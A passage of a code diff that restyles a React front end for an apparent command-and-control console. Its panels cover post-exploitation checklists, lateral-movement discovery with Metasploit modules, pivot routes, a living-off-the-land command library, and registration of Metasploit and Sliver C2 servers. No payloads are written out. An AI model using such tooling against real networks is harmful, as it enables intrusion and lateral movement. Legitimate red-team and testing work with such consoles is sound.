+                      style={{ width: '100%', background: 'var(--bg)', border: rule, borderRadius: 4, padding: '6px 8px', fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', outline: 'none', resize: 'none', boxSizing: 'border-box' }}
                       rows={4}
                     />
                     <button
                       onClick={handleParseSysinfo}
                       disabled={parsingSysinfo || !sysinfoRaw.trim()}
-                      className="w-full py-1.5 rounded-lg bg-cyan-900/40 hover:bg-cyan-800/50 border border-cyan-700/30 text-xs text-cyan-300 transition-all disabled:opacity-40 flex items-center justify-center gap-1.5"
+                      style={{ width: '100%', padding: '6px 0', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 11, color: 'var(--accent)', cursor: (parsingSysinfo || !sysinfoRaw.trim()) ? 'not-allowed' : 'pointer', opacity: (parsingSysinfo || !sysinfoRaw.trim()) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontFamily: 'var(--font-sans)' }}
                     >
-                      {parsingSysinfo ? <RefreshCw size={11} className="animate-spin" /> : <Shield size={11} />}
+                      {parsingSysinfo ? <Icon name="refresh" size={11} className="animate-spin" /> : <Icon name="shield" size={11} />}
                       Parse & Save
                     </button>
                   </div>
                 </div>
 
                 {/* Checklist */}
-                <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
-                  <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
-                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                      <ListChecks size={13} /> Post-Ex Checklist
+                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
+                  <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: 8 }}>
+                      <Icon name="check" size={13} /> Post-Ex Checklist
                     </span>
-                    <div className="flex items-center gap-3">
-                      <span className="text-xs text-slate-600">
+                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+                      <span style={{ fontSize: 11, color: 'var(--fg-4)' }}>
                         {checklist.filter(i => i.done).length}/{checklist.length} done
                       </span>
                       <button
                         onClick={async () => {
                           if (!activeSession) return
-                          const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/checklist/reset`, { method: 'POST' })
+                          const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/checklist/reset`, { method: 'POST' })
                           if (res.ok) setChecklist(await res.json())
                         }}
-                        className="text-[11px] text-slate-600 hover:text-amber-400 transition-colors"
+                        style={{ fontSize: 11, color: 'var(--fg-4)', background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'var(--font-sans)' }}
                         title="Reset checklist"
                       >
                         Reset
@@ -1984,23 +2138,23 @@ export default function C2Console() {
                       evidence: 'Evidence', persistence: 'Persistence', lateral: 'Lateral Movement',
                     }
                     return (
-                      <div key={cat} className="border-b border-cyan-900/10 last:border-0">
-                        <div className="px-4 py-1.5 bg-cyan-950/10 text-[10px] font-semibold text-slate-500 uppercase tracking-wider">
+                      <div key={cat} style={{ borderBottom: rule }}>
+                        <div style={{ padding: '6px 16px', background: 'rgba(240,168,58,0.04)', fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                           {catLabels[cat]}
                         </div>
                         {items.map(item => (
-                          <label key={item.id} className="flex items-center gap-3 px-4 py-2.5 hover:bg-cyan-950/10 cursor-pointer transition-colors">
+                          <label key={item.id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '10px 16px', cursor: 'pointer' }}>
                             <input
                               type="checkbox"
                               checked={item.done}
                               onChange={e => toggleChecklistItem(item.id, e.target.checked)}
-                              className="w-3.5 h-3.5 accent-cyan-500 cursor-pointer flex-shrink-0"
+                              style={{ width: 14, height: 14, accentColor: 'var(--accent)', cursor: 'pointer', flexShrink: 0 }}
                             />
-                            <span className={`text-xs transition-colors ${item.done ? 'line-through text-slate-600' : 'text-slate-300'}`}>
+                            <span style={{ fontSize: 11, color: item.done ? 'var(--fg-4)' : 'var(--fg)', textDecoration: item.done ? 'line-through' : 'none' }}>
                               {item.label}
                             </span>
                             {item.done && item.done_at && (
-                              <span className="ml-auto text-[10px] text-slate-600 flex-shrink-0">
+                              <span style={{ marginLeft: 'auto', fontSize: 10, color: 'var(--fg-4)', flexShrink: 0 }}>
                                 {new Date(item.done_at).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}
                               </span>
                             )}
@@ -2011,34 +2165,33 @@ export default function C2Console() {
                   })}
                 </div>
 
-                {/* Pivot Routes */}
                 {/* Lateral Movement Discovery */}
-                <div className="glass rounded-xl overflow-hidden border border-amber-900/20">
-                  <div className="px-4 py-3 border-b border-amber-900/20 flex items-center justify-between">
-                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
-                      <Network size={13} className="text-amber-400" /> Lateral Movement
+                <div style={{ background: 'var(--bg-2)', border: '1px solid rgba(240,168,58,0.2)', borderRadius: 4, overflow: 'hidden' }}>
+                  <div style={{ padding: '10px 16px', borderBottom: '1px solid rgba(240,168,58,0.15)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: 8 }}>
+                      <Icon name="network" size={13} style={{ color: 'var(--accent)' }} /> Lateral Movement
                     </span>
                     <button
                       onClick={handleLateralDiscover}
                       disabled={discoveringLateral}
-                      className="flex items-center gap-1 px-2 py-1 rounded bg-amber-900/30 hover:bg-amber-800/40 border border-amber-700/20 text-[10px] text-amber-300 transition-all disabled:opacity-40"
+                      style={{ display: 'flex', alignItems: 'center', gap: 4, padding: '4px 8px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 10, color: 'var(--accent)', cursor: discoveringLateral ? 'not-allowed' : 'pointer', opacity: discoveringLateral ? 0.4 : 1, fontFamily: 'var(--font-sans)' }}
                     >
-                      {discoveringLateral ? <RefreshCw size={10} className="animate-spin" /> : <Zap size={10} />}
+                      {discoveringLateral ? <Icon name="refresh" size={10} className="animate-spin" /> : <Icon name="bolt" size={10} />}
                       {lateralResult ? 'Re-Analyse' : 'Analyse'}
                     </button>
                   </div>
 
                   {lateralResult ? (
-                    <div className="p-3 space-y-3 text-xs">
+                    <div style={{ padding: 12, display: 'flex', flexDirection: 'column', gap: 12, fontSize: 11 }}>
                       {/* Subnets */}
                       <div>
-                        <div className="text-[10px] text-slate-600 uppercase tracking-wider mb-1">Adjacent Subnets</div>
-                        <div className="flex flex-wrap gap-1.5">
+                        <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }}>Adjacent Subnets</div>
+                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                           {lateralResult.subnets.map(s => (
                             <button
                               key={s}
                               onClick={() => setNewRouteSubnet(s.split('/')[0])}
-                              className="font-mono text-[10px] px-1.5 py-0.5 rounded bg-amber-950/30 border border-amber-700/20 text-amber-300 hover:border-amber-500/40 transition-colors"
+                              style={{ fontFamily: 'var(--font-mono)', fontSize: 10, padding: '2px 6px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', color: 'var(--accent)', cursor: 'pointer' }}
                               title="Click to prefill route"
                             >
                               {s}
@@ -2049,24 +2202,24 @@ export default function C2Console() {
 
                       {/* Techniques */}
                       <div>
-                        <div className="text-[10px] text-slate-600 uppercase tracking-wider mb-1">
+                        <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }}>
                           Techniques ({lateralResult.cred_types_available.length > 0 ? lateralResult.cred_types_available.join(', ') : 'no creds'})
                         </div>
-                        <div className="space-y-1.5">
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                           {lateralResult.techniques.map(t => (
-                            <div key={t.id} className="flex items-start gap-2 p-2 rounded-lg bg-amber-950/20 border border-amber-900/20">
-                              <Crosshair size={10} className="text-amber-400 flex-shrink-0 mt-0.5" />
-                              <div className="flex-1 min-w-0">
-                                <div className="font-medium text-slate-200">{t.label}</div>
-                                <div className="text-[10px] text-slate-500 mt-0.5">{t.description}</div>
+                            <div key={t.id} style={{ display: 'flex', alignItems: 'flex-start', gap: 8, padding: 8, borderRadius: 4, background: 'rgba(240,168,58,0.06)', border: '1px solid rgba(240,168,58,0.15)' }}>
+                              <Icon name="target" size={10} style={{ color: 'var(--accent)', flexShrink: 0, marginTop: 2 }} />
+                              <div style={{ flex: 1, minWidth: 0 }}>
+                                <div style={{ fontWeight: 500, color: 'var(--fg)' }}>{t.label}</div>
+                                <div style={{ fontSize: 10, color: 'var(--fg-3)', marginTop: 2 }}>{t.description}</div>
                                 {t.msf_module && (
-                                  <div className="flex items-center gap-1 mt-1">
-                                    <code className="text-[9px] font-mono text-amber-300/80">{t.msf_module}</code>
+                                  <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginTop: 4 }}>
+                                    <code style={{ fontSize: 9, fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>{t.msf_module}</code>
                                     <button
                                       onClick={() => navigator.clipboard.writeText(t.msf_module!)}
-                                      className="text-slate-700 hover:text-amber-400 transition-colors"
+                                      style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}
                                     >
-                                      <Copy size={9} />
+                                      <Icon name="copy" size={9} />
                                     </button>
                                   </div>
                                 )}
@@ -2078,73 +2231,74 @@ export default function C2Console() {
 
                       {/* Discovery modules */}
                       <div>
-                        <div className="text-[10px] text-slate-600 uppercase tracking-wider mb-1">Discovery Modules</div>
+                        <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 4 }}>Discovery Modules</div>
                         {lateralResult.discovery_modules.map(m => (
-                          <div key={m.name} className="flex items-center gap-2 py-1 border-b border-amber-900/10">
-                            <code className="text-[9px] font-mono text-slate-400 flex-1 truncate">{m.name}</code>
-                            <button onClick={() => navigator.clipboard.writeText(m.name)} className="text-slate-700 hover:text-amber-400 transition-colors flex-shrink-0">
-                              <Copy size={9} />
+                          <div key={m.name} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '4px 0', borderBottom: rule }}>
+                            <code style={{ fontSize: 9, fontFamily: 'var(--font-mono)', color: 'var(--fg-3)', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{m.name}</code>
+                            <button onClick={() => navigator.clipboard.writeText(m.name)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0, flexShrink: 0 }}>
+                              <Icon name="copy" size={9} />
                             </button>
                           </div>
                         ))}
                       </div>
                     </div>
                   ) : (
-                    <div className="px-4 py-5 text-center text-[11px] text-slate-600">
+                    <div style={{ padding: '20px 16px', textAlign: 'center', fontSize: 11, color: 'var(--fg-4)' }}>
                       Click Analyse to discover pivot paths and lateral movement opportunities.
                     </div>
                   )}
                 </div>
 
-                <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
-                  <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center gap-2">
-                    <Network size={13} className="text-cyan-400" />
-                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Pivot Routes</span>
-                    {pivotRoutes.length > 0 && <span className="text-xs text-cyan-400 ml-1">({pivotRoutes.length})</span>}
+                {/* Pivot Routes */}
+                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
+                  <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', gap: 8 }}>
+                    <Icon name="network" size={13} style={{ color: 'var(--accent)' }} />
+                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Pivot Routes</span>
+                    {pivotRoutes.length > 0 && <span style={{ fontSize: 11, color: 'var(--accent)', marginLeft: 4 }}>({pivotRoutes.length})</span>}
                   </div>
 
                   {/* Add route form */}
-                  <div className="p-4 border-b border-cyan-900/10">
-                    <div className="flex gap-2 items-end">
-                      <div className="flex-1">
-                        <label className="text-[10px] text-slate-500 mb-1 block">Subnet</label>
+                  <div style={{ padding: 16, borderBottom: rule }}>
+                    <div style={{ display: 'flex', gap: 8, alignItems: 'flex-end' }}>
+                      <div style={{ flex: 1 }}>
+                        <label style={{ fontSize: 10, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Subnet</label>
                         <input
                           value={newRouteSubnet}
                           onChange={e => setNewRouteSubnet(e.target.value)}
                           placeholder="10.10.10.0"
-                          className={inputClass}
+                          style={inputClass}
                         />
                       </div>
-                      <div className="w-40">
-                        <label className="text-[10px] text-slate-500 mb-1 block">Netmask</label>
+                      <div style={{ width: 160 }}>
+                        <label style={{ fontSize: 10, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Netmask</label>
                         <input
                           value={newRouteNetmask}
                           onChange={e => setNewRouteNetmask(e.target.value)}
                           placeholder="255.255.255.0"
-                          className={inputClass}
+                          style={inputClass}
                         />
                       </div>
                       <button
                         onClick={handleAddRoute}
                         disabled={addingRoute || !newRouteSubnet}
-                        className="px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-sm text-white transition-all flex-shrink-0"
+                        style={{ padding: '8px 16px', borderRadius: 4, background: 'var(--accent)', border: 'none', color: '#0d0c0a', fontSize: 13, fontWeight: 600, cursor: (addingRoute || !newRouteSubnet) ? 'not-allowed' : 'pointer', opacity: (addingRoute || !newRouteSubnet) ? 0.4 : 1, flexShrink: 0, display: 'flex', alignItems: 'center', fontFamily: 'var(--font-sans)' }}
                       >
-                        {addingRoute ? <RefreshCw size={14} className="animate-spin" /> : 'Add'}
+                        {addingRoute ? <Icon name="refresh" size={14} className="animate-spin" /> : 'Add'}
                       </button>
                     </div>
                   </div>
 
                   {pivotRoutes.length === 0 ? (
-                    <div className="text-center text-slate-600 py-6 text-xs">No pivot routes added</div>
+                    <div style={{ textAlign: 'center', color: 'var(--fg-4)', padding: '24px 0', fontSize: 11 }}>No pivot routes added</div>
                   ) : (
-                    <div className="divide-y divide-cyan-900/10">
+                    <div>
                       {pivotRoutes.map(r => (
-                        <div key={r.id} className="flex items-center gap-3 px-4 py-2.5 hover:bg-cyan-950/10">
-                          <span className="w-2 h-2 rounded-full bg-green-500 flex-shrink-0" />
-                          <code className="flex-1 text-xs font-mono text-slate-300">{r.subnet}/{r.netmask}</code>
-                          <span className="text-[10px] text-slate-600 mr-2">via session {r.session_id}</span>
-                          <button onClick={() => handleRemoveRoute(r.id)} className="text-slate-600 hover:text-red-400 transition-colors">
-                            <X size={13} />
+                        <div key={r.id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '10px 16px', borderBottom: rule }}>
+                          <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--ok)', flexShrink: 0 }} />
+                          <code style={{ flex: 1, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg)' }}>{r.subnet}/{r.netmask}</code>
+                          <span style={{ fontSize: 10, color: 'var(--fg-4)', marginRight: 8 }}>via session {r.session_id}</span>
+                          <button onClick={() => handleRemoveRoute(r.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}>
+                            <Icon name="x" size={13} />
                           </button>
                         </div>
                       ))}
@@ -2158,23 +2312,23 @@ export default function C2Console() {
 
         {/* LOTL tab */}
         {activeTab === 'lotl' && (
-          <div className="flex-1 overflow-y-auto">
-            <div className="glass rounded-xl p-4 border border-cyan-900/20 mb-4">
-              <div className="flex items-center gap-3 flex-wrap">
-                <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
-                  <BookOpen size={14} className="text-cyan-400" /> Living-off-the-Land Command Library
+          <div style={{ flex: 1, overflowY: 'auto' }}>
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16, marginBottom: 16 }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap' }}>
+                <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', display: 'flex', alignItems: 'center', gap: 8 }}>
+                  <Icon name="book" size={14} style={{ color: 'var(--accent)' }} /> Living-off-the-Land Command Library
                 </h3>
                 <input
-                  className="flex-1 min-w-[160px] bg-[#05080d] border border-cyan-900/30 rounded-lg px-3 py-1 text-xs text-slate-300 outline-none focus:border-cyan-500/50"
+                  style={{ flex: 1, minWidth: 160, background: 'var(--bg)', border: rule, borderRadius: 4, padding: '4px 12px', fontSize: 11, color: 'var(--fg)', outline: 'none' }}
                   placeholder="Search commands..."
                   value={lotlSearch}
                   onChange={e => setLotlSearch(e.target.value)}
                 />
-                <div className="flex gap-1">
+                <div style={{ display: 'flex', gap: 4 }}>
                   {(['all', 'linux', 'windows'] as const).map(f => (
                     <button key={f} onClick={() => setLotlFilter(f)}
-                      className={`px-2.5 py-1 rounded text-xs transition-all ${lotlFilter === f ? 'bg-cyan-600 text-white' : 'text-slate-400 hover:text-slate-200'}`}>
-                      {f === 'all' ? 'All' : f === 'linux' ? '🐧 Linux' : '🪟 Windows'}
+                      style={{ padding: '4px 10px', borderRadius: 4, fontSize: 11, cursor: 'pointer', fontFamily: 'var(--font-sans)', background: lotlFilter === f ? 'var(--accent)' : 'none', color: lotlFilter === f ? '#0d0c0a' : 'var(--fg-3)', border: lotlFilter === f ? 'none' : rule, fontWeight: lotlFilter === f ? 600 : 400 }}>
+                      {f === 'all' ? 'All' : f === 'linux' ? 'Linux' : 'Windows'}
                     </button>
                   ))}
                 </div>
@@ -2182,7 +2336,7 @@ export default function C2Console() {
             </div>
 
             {lotlLib.length === 0 ? (
-              <div className="text-slate-600 text-sm text-center py-12">Loading...</div>
+              <div style={{ color: 'var(--fg-4)', fontSize: 13, textAlign: 'center', padding: '48px 0' }}>Loading...</div>
             ) : lotlLib.map(cat => {
               const cmds = cat.commands.filter(c => {
                 if (lotlFilter !== 'all' && c.platform !== lotlFilter) return false
@@ -2194,39 +2348,315 @@ export default function C2Console() {
               })
               if (cmds.length === 0) return null
               return (
-                <div key={cat.id} className="glass rounded-xl border border-cyan-900/20 mb-4 overflow-hidden">
-                  <div className="px-4 py-2 border-b border-cyan-900/20 bg-cyan-950/20">
-                    <span className="text-xs font-semibold text-cyan-300">{cat.label}</span>
+                <div key={cat.id} style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, marginBottom: 16, overflow: 'hidden' }}>
+                  <div style={{ padding: '8px 16px', borderBottom: rule, background: 'rgba(240,168,58,0.04)' }}>
+                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--accent)' }}>{cat.label}</span>
                   </div>
-                  <div className="divide-y divide-cyan-900/10">
+                  <div>
                     {cmds.map(cmd => (
-                      <div key={cmd.id} className="p-3 hover:bg-cyan-950/10 group">
-                        <div className="flex items-start justify-between gap-2 mb-1">
-                          <div className="flex items-center gap-2">
-                            <span className={`text-[9px] px-1.5 py-0.5 rounded font-mono ${cmd.platform === 'linux' ? 'bg-green-900/40 text-green-400' : 'bg-blue-900/40 text-blue-400'}`}>
+                      <div key={cmd.id} style={{ padding: 12, borderBottom: rule }}>
+                        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 8, marginBottom: 4 }}>
+                          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                            <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, fontFamily: 'var(--font-mono)', color: cmd.platform === 'linux' ? 'var(--ok)' : 'var(--med)', background: cmd.platform === 'linux' ? 'rgba(84,175,97,0.1)' : 'rgba(180,130,60,0.1)' }}>
                               {cmd.platform}
                             </span>
-                            <span className="text-xs text-slate-300 font-medium">{cmd.label}</span>
+                            <span style={{ fontSize: 11, color: 'var(--fg)', fontWeight: 500 }}>{cmd.label}</span>
                           </div>
-                          <div className="flex items-center gap-2 flex-shrink-0">
-                            <span className="text-[10px] text-amber-500/70 font-mono">{cmd.mitre}</span>
+                          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexShrink: 0 }}>
+                            <span style={{ fontSize: 10, color: 'var(--accent)', fontFamily: 'var(--font-mono)', opacity: 0.7 }}>{cmd.mitre}</span>
                             <button
                               onClick={() => { navigator.clipboard.writeText(cmd.cmd); setLotlCopied(cmd.id); setTimeout(() => setLotlCopied(''), 2000) }}
-                              className="opacity-0 group-hover:opacity-100 transition-opacity text-slate-400 hover:text-cyan-400"
+                              style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}
                               title="Copy command"
                             >
-                              {lotlCopied === cmd.id ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
+                              {lotlCopied === cmd.id ? <Icon name="check" size={12} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={12} />}
                             </button>
                           </div>
                         </div>
-                        <pre className="text-[10px] text-cyan-300/80 font-mono bg-[#05080d] rounded px-2 py-1.5 overflow-x-auto mb-1 whitespace-pre-wrap break-all">{cmd.cmd}</pre>
-                        <p className="text-[10px] text-slate-500">{cmd.notes}</p>
+                        <pre style={{ fontSize: 10, color: 'var(--fg-2)', fontFamily: 'var(--font-mono)', background: 'var(--bg)', borderRadius: 4, padding: '6px 8px', overflowX: 'auto', marginBottom: 4, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{cmd.cmd}</pre>
+                        <p style={{ fontSize: 10, color: 'var(--fg-3)' }}>{cmd.notes}</p>
                       </div>
                     ))}
                   </div>
                 </div>
               )
             })}
+          </div>
+        )}
+
+        {/* Infrastructure tab */}
+        {activeTab === 'infra' && (
+          <div style={{ flex: 1, overflowY: 'auto', padding: '0 0 24px 0' }}>
+
+            {/* C2 Node Registry */}
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, margin: '16px 0', overflow: 'hidden' }}>
+              <div style={{ padding: '12px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', gap: 12 }}>
+                <Icon name="radio" size={14} style={{ color: 'var(--accent)' }} />
+                <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)' }}>C2 Node Registry</span>
+                <div style={{ marginLeft: 'auto', display: 'flex', gap: 8 }}>
+                  <button
+                    onClick={() => { c2Nodes.forEach(n => handleCheckNode(n.id)) }}
+                    className="btn btn-sm btn-ghost"
+                    disabled={c2Nodes.length === 0}
+                  >Check All</button>
+                  <button
+                    onClick={() => setAddNodeOpen(o => !o)}
+                    className="btn btn-sm"
+                  ><Icon name="plus" size={11} /> Add Node</button>
+                </div>
+              </div>
+
+              {addNodeOpen && (
+                <div style={{ padding: 16, borderBottom: rule, background: 'rgba(240,168,58,0.03)', display: 'flex', flexDirection: 'column', gap: 12 }}>
+                  {nodeError && <div style={{ fontSize: 11, color: 'var(--crit)', fontFamily: 'var(--font-mono)' }}>{nodeError}</div>}
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>NAME</label>
+                      <input value={nodeFormName} onChange={e => setNodeFormName(e.target.value)} placeholder="My MSF Server" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>TYPE</label>
+                      <select value={nodeFormType} onChange={e => setNodeFormType(e.target.value as 'msf' | 'sliver')} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
+                        <option value="msf">Metasploit (msfrpcd)</option>
+                        <option value="sliver">Sliver</option>
+                      </select>
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>HOST</label>
+                      <input value={nodeFormHost} onChange={e => setNodeFormHost(e.target.value)} placeholder="192.168.1.100" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>PORT</label>
+                      <input value={nodeFormPort} onChange={e => setNodeFormPort(e.target.value)} placeholder="55553" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>PASSWORD</label>
+                      <input type="password" value={nodeFormPass} onChange={e => setNodeFormPass(e.target.value)} placeholder="RPC password" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div style={{ display: 'flex', alignItems: 'flex-end', gap: 10 }}>
+                      <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, color: 'var(--fg-2)', cursor: 'pointer' }}>
+                        <input type="checkbox" checked={nodeFormSsl} onChange={e => setNodeFormSsl(e.target.checked)} />
+                        SSL / TLS
+                      </label>
+                    </div>
+                  </div>
+                  <input value={nodeFormNotes} onChange={e => setNodeFormNotes(e.target.value)} placeholder="Notes (optional)" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                  <div style={{ display: 'flex', gap: 8 }}>
+                    <button onClick={handleAddNode} disabled={savingNode} className="btn btn-sm btn-primary">{savingNode ? 'Saving…' : 'Save Node'}</button>
+                    <button onClick={() => { setAddNodeOpen(false); setNodeError('') }} className="btn btn-sm btn-ghost">Cancel</button>
+                  </div>
+                </div>
+              )}
+
+              {loadingNodes ? (
+                <div style={{ padding: '32px 16px', textAlign: 'center', color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>Loading…</div>
+              ) : c2Nodes.length === 0 ? (
+                <div style={{ padding: '32px 16px', textAlign: 'center', color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>No C2 nodes registered. Add one above or launch an EC2 instance below.</div>
+              ) : (
+                <table className="data">
+                  <thead>
+                    <tr>
+                      <th>Name</th>
+                      <th style={{ width: 80 }}>Type</th>
+                      <th style={{ width: 180 }}>Host : Port</th>
+                      <th style={{ width: 90 }}>Status</th>
+                      <th style={{ width: 70 }}>Source</th>
+                      <th style={{ width: 140 }}></th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {c2Nodes.map(n => {
+                      const isActive = n.id === activeNodeId
+                      const statusColor = n.status === 'connected' ? 'var(--ok)' : n.status === 'unreachable' ? 'var(--crit)' : n.status === 'pending' ? 'var(--accent)' : 'var(--fg-3)'
+                      return (
+                        <tr key={n.id} style={{ background: isActive ? 'rgba(84,175,97,0.04)' : undefined }}>
+                          <td style={{ fontWeight: 500 }}>
+                            {n.name}
+                            {isActive && <span style={{ fontSize: 9, marginLeft: 8, color: 'var(--ok)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase' }}>active</span>}
+                          </td>
+                          <td>
+                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: n.c2_type === 'msf' ? 'var(--accent)' : '#a78bfa', background: n.c2_type === 'msf' ? 'rgba(240,168,58,0.1)' : 'rgba(167,139,250,0.1)', border: `1px solid ${n.c2_type === 'msf' ? 'rgba(240,168,58,0.3)' : 'rgba(167,139,250,0.3)'}` }}>{n.c2_type}</span>
+                          </td>
+                          <td className="mono" style={{ fontSize: 11 }}>{n.host}:{n.port}</td>
+                          <td>
+                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: statusColor }}>{n.status}</span>
+                          </td>
+                          <td>
+                            <span style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)' }}>{n.source}</span>
+                          </td>
+                          <td>
+                            <div style={{ display: 'flex', gap: 6 }}>
+                              <button
+                                onClick={() => handleCheckNode(n.id)}
+                                disabled={checkingNodeId === n.id}
+                                className="btn btn-sm btn-ghost"
+                                style={{ fontSize: 10 }}
+                              >{checkingNodeId === n.id ? '…' : 'Check'}</button>
+                              <button
+                                onClick={() => handleConnectNode(n.id)}
+                                disabled={connectingNodeId === n.id || isActive}
+                                className="btn btn-sm"
+                                style={{ fontSize: 10, color: 'var(--ok)', borderColor: 'rgba(84,175,97,0.4)' }}
+                              >{connectingNodeId === n.id ? 'Connecting…' : isActive ? 'Connected' : 'Connect'}</button>
+                              <button
+                                onClick={() => handleDeleteNode(n.id)}
+                                className="btn btn-sm btn-ghost"
+                                style={{ fontSize: 10, color: 'var(--crit)' }}
+                              >Del</button>
+                            </div>
+                          </td>
+                        </tr>
+                      )
+                    })}
+                  </tbody>
+                </table>
+              )}
+            </div>
+
+            {/* AWS EC2 Provisioning */}
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
+              <div style={{ padding: '12px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', gap: 12 }}>
+                <Icon name="layers" size={14} style={{ color: '#a78bfa' }} />
+                <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)' }}>AWS EC2 C2 Nodes</span>
